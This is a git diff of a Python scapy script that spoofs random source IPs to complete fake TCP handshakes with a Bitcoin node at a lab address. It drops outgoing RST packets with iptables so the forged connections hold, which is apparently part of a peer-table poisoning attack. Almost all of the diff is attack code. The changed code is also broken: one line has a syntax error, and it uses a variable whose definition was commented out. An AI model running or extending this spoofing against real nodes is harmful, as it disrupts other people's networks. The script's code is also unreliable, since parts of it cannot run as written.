@@ -13,7 +13,7 @@ from bitcoin.net import CAddress
 
 victim_ip = '10.0.2.5'
 victim_port = 833
-attacker_port = 833
+attacker_port = random.randint(1024,65535)
 
 pending_spoof_IPs = []
 successful_spoof_IPs = []
@@ -25,7 +25,7 @@ iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
 print(iptables_file_path)
 
 def terminal(cmd):
-	print('\n> '+cmd)
+	# print('\n> '+cmd)
 	print(os.popen(cmd).read())
 
 def random_ip():
@@ -41,14 +41,24 @@ def version_pkt(src_ip, dst_ip, port):
     return msg
 
 def spoof(src_ip, dst_ip):
-	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 	src_port = attacker_port
 	dst_port = victim_port
+	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
+	
+	ip = IP(src=src_ip, dst=dst_ip)
 
-	ip = IP(src = src_ip, dst = dst_ip)
-	SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
-	SYNACK=sr1(ip/SYN)
-	send(SYNACK)
+	#SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
+	SYN = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
+	#SYNACK=sr1(ip/SYN)
+
+	#send(SYNACK)
+	time.sleep(1)
+
+	print('Sending second packet')
+	#ACK=TCP(sport=src_port, dport=dst_port, flags="S", seq=seq, ack=SYNACK.seq)
+	ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=SYNACK.ack + 1, ack=SYNACK.seq + 2+)
+	send(ip/ACK)
+
 	#pkt_spoof = ip/tcp
 
 	print('Handshake COMPLETE')
@@ -73,7 +83,6 @@ def spoof(src_ip, dst_ip):
 	print('\n\n*** ')
 	print('CONNECTION ESTABLISHED')
 
-	time.sleep(5)
 	s.close()
 
 	print('CONNECTION CLOSED')
@@ -182,9 +191,10 @@ if __name__ == '__main__':
 	atexit.register(cleanup_iptables)
 	cleanup_iptables()
 	backup_iptables()
+
+	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -dport {victim_port} -j DROP')
 	terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
-	#terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s SPOOFIP -dport PORT -j DROP')
-	time.sleep(10)
+	#time.sleep(10)
 	try:
 		start_new_thread(sniff, (), {
 			'iface':'enp0s3',
